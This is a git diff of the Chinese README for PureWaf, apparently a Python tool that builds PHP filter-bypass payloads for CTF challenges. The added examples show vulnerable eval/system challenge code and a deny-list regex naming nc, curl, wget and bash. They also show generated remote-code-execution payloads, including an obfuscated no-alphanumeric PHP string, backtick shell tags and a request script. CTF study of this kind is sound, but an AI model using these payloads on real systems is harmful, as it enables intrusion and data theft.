@@ -2,6 +2,8 @@
 
 ![Pepy Total Downloads](https://img.shields.io/pepy/dt/PureWaf) [![PyPI version](https://img.shields.io/pypi/v/PureWaf.svg)](https://pypi.org/project/PureWaf/) ![License](https://img.shields.io/badge/license-Apache_2.0-cyan.svg) ![Github stars](https://img.shields.io/github/stars/PureStream108/PureWaf.svg) ![Example](https://github.com/PureStream108/PureWaf/actions/workflows/eg.yml/badge.svg) [![codecov](https://codecov.io/gh/PureStream108/PureWaf/branch/main/graph/badge.svg)](https://codecov.io/gh/PureStream108/PureWaf)
 
+![](./image/1.png)
+
 该项目仅用于教育和学习环节（比如说CTF），不得应用于其他任何恶意目的。
 
 如果该项目出现任何错误或您有任何建议，欢迎在 `issues` 中提出。
@@ -55,7 +57,7 @@ system($cmd);
 ```bash
 pip install PureWaf
 
-import PureWaf
+from PureWaf import purewaf
 ```
 
 ## Parameters
@@ -104,24 +106,52 @@ import PureWaf
 
 php版本，默认为7.0，针对不同php版本的题目环境，你可以自行设置 phpv，以便 PureWaf 将已经不适用的 payload 给剔除。
 
+**upload**
+
+默认为 False（关闭），开启后会生成由 `<?php` 等包裹后的 payload，适用于部分上传文件场景，可结合 phpv 使用
+
 ## Examples
 
-（待完善用法）
+**CISCN 2024 simple_php**
 
-**MoeCTF2025 这是…Webshell？**
+[ctf.show](https://ctf.show/challenges#simple_php-4329)
 
 ```PHP
-<?php
-highlight_file(__FILE__);
-if(isset($_GET['shell'])) {
-    $shell = $_GET['shell'];
-    if(!preg_match('/[A-Za-z0-9]/is', $_GET['shell'])) {
-        eval($shell);
-    } else {
-        echo "Hacker!";
-    }
+ini_set('open_basedir', '/var/www/html/');
+error_reporting(0);
+
+if(isset($_POST['cmd'])){
+    $cmd = escapeshellcmd($_POST['cmd']); 
+     if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
+         system($cmd);
 }
+}
+
+
+show_source(__FILE__);
 ?>
+```
+
+直接提取题中Waf：
+
+```
+/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/
+```
+
+然后直接输入到PureWaf中：（这里的需要增加 `r`，不然 `\*` 会报 SyntaxWarning ）
+
+```python
+import PureWaf
+
+w = PureWaf.purewaf( waf_regex=r"/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i",
+flagfile="/etc/passwd"
+)
+
+print(w)
+
+
+# [+] Shortest Root Payload : diff / /tmp
+# [+] Shortest Flag Payload : rev /etc/passwd
 ```
 
 **[红明谷CTF 2021]write_shell**
@@ -167,6 +197,65 @@ switch($_GET["action"] ?? "") {
 ?>
 ```
 
+依旧是：
+
+```python
+import PureWaf
+
+w = PureWaf.purewaf(
+    waf_regex=r"/'| |_|php|;|~|\\^|\\+|eval|{|}/i",
+    upload=True
+)
+
+print(w)
+```
+
+但是这次增加一个 upload 的参数，用于适配上传环境的 payload
+
+结果如下：
+
+```
+[*] Generating payloads for Root Directory...
+[========================] 960/960 passed:336
+
+[*] Generating payloads for Flag File...
+[========================] 5067/5067 passed:812
+
+----------------------------------------
+[+] Shortest Root Payload : <?=`ls</`?>
+[+] Shortest Flag Payload : <?=`nl</flag`?>
+----------------------------------------
+```
+
+**MoeCTF2025 这是…Webshell？**
+
+```PHP
+<?php
+highlight_file(__FILE__);
+if(isset($_GET['shell'])) {
+    $shell = $_GET['shell'];
+    if(!preg_match('/[A-Za-z0-9]/is', $_GET['shell'])) {
+        eval($shell);
+    } else {
+        echo "Hacker!";
+    }
+}
+?>
+```
+
+直接将 Waf 输入
+
+```
+----------------------------------------
+[+] Shortest Root Payload : N/A
+[+] Shortest Flag Payload : $__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___=眰;$____.=~($___[$_]);$___=和;$____.=~($___[$__]);$___=和;$____.=~($___[$__]);$___=的;$____.=~($___[$_]);$___=半;$____.=~($___[$_]);$___=始;$____.=~($___[$__]);$_____='_';$___=俯;$_____.=~($___[$__]);$___=眰;$_____.=~($___[$__]);$___=次;$_____.=~($___[$_]);$___=站;$_____.=~($___[$_]);$_=$$_____;$____($_[$__]);
+----------------------------------------
+
+TIPS: POST: 2=system('id');
+```
+
+会生成一个 TIPS，以提示 payload 后续该如何使用（不过记得自增类型的需要URL编码后使用）
+
 **middlerce | NSSCTF**
 
 [[NISACTF 2022\]middlerce | NSSCTF](https://www.nssctf.cn/problem/1897)
@@ -191,44 +280,63 @@ else{
 ?>
 ```
 
-**CISCN 2024 simple_php**
+直接将 Waf 套入 PureWaf：
 
-```PHP
-ini_set('open_basedir', '/var/www/html/');
-error_reporting(0);
+```python
+import PureWaf
 
-if(isset($_POST['cmd'])){
-    $cmd = escapeshellcmd($_POST['cmd']); 
-     if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
-         system($cmd);
-}
-}
+w = PureWaf.purewaf(
+    waf_regex=r"/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m",
+)
 
-
-show_source(__FILE__);
-?>
+print(w)
 ```
 
+虽然最后输出N/A，但不同的是，会生成 Example 以提示可以利用的方法：
 
+```
+----------------------------------------
+[+] Shortest Root Payload : N/A
+[+] Shortest Flag Payload : N/A
+----------------------------------------
+
+Example:
+
+import requests
+
+url = ""
+payload = '{"cmd":"?><?=`sort /f*`?>","+":"' + "-" * 1000000 + '"}'
+res = requests.post(url=url, data={"letter": payload})
+print(res.text)
+
+N/A
+```
 
 ## Limitations
 
-- 暂时无法实现读取并写入新文件的操作
-- 暂时无法实现输出除了读取文件/列目录/读环境变量...以外的命令操作
 - 暂时无法实现自定义命令
 - 暂时没有图形化界面
-- 暂时没有内部检查payload是否可行机制（类似起一个http服务）
+- 暂时没有内部检查payload是否可行机制
 - 暂时没有白名单选项
+- 暂时只适配 eval($a) 情形
 
 （我们将在未来计划消除这些限制，并同步更新至README）
 
 ## Contributing
 
-1
+欢迎在 issues 中提供 PureWaf 无法解出的题目并附带对应的wp！
+
+供题者的 ID 将会出现在下一版本的 release中！
 
 ## Thanks & References
 
-...
+[无字母数字webshell之提高篇 | 离别歌](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
+
+[RCE（远程代码执行漏洞）函数&命令&绕过总结 - 星海河 - 博客园](https://www.cnblogs.com/xinghaihe/p/18723674)
+
+[以一道CTF题目看无参数RCE - 泠涯 - 博客园](https://www.cnblogs.com/hello-there/p/12880566.html)
+
+[CTF中的RCE绕过-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2393421)
 
 ## Star History
 
